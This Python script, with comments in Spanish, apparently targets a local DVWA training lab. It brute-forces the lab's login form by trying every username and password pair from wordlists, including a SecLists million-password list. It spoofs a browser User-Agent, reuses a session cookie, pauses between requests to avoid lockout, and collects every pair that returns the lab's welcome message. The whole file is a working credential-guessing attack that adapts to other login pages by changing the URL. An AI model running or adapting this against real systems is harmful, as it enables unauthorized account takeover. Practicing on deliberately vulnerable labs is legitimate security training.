import time
import requests

# configuración inicial
target_url = "http://localhost:4280/vulnerabilities/brute/"
cookie = {"PHPSESSID": "28a54b4c1cd8c567f83db617203bc39f", "security": "low"}

# leer listas de usuarios y contraseñas
def load_wordlist(filename):
    with open(filename, 'r') as f:
        return [line.strip() for line in f]

users = load_wordlist("usernames.txt")
passwords = load_wordlist("1000000-password-seclists.txt")

# cabeceras HTTP
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Referer": "http://localhost:4280/vulnerabilities/brute/"
}

# realizar el ataque
print("[*] Iniciando ataque de fuerza bruta...")
found_credentials = []

for user in users:
    for password in passwords:
        params = {
            "username": user,
            "password": password,
            "Login": "Login"
        }
        
        try:
            response = requests.get(
                target_url, 
                params=params, 
                cookies=cookie, 
                headers=headers,
                timeout=5
            )
            
            if "Welcome to the password protected area" in response.text:
                print(f"Credenciales válidas encontradas: {user}:{password}")
                found_credentials.append((user, password))
            
            # Pequeña pausa para evitar bloqueos
            time.sleep(0.5)
            
        except Exception as e:
            print(f"Error probando {user}:{password} - {str(e)}")

# resultados finales
print("\nResumen de credenciales encontradas:")
for i, (user, password) in enumerate(found_credentials, 1):
    print(f"{i}. Usuario: {user} - Contraseña: {password}")

if not found_credentials:
    print("[No se encontraron credenciales válidas]")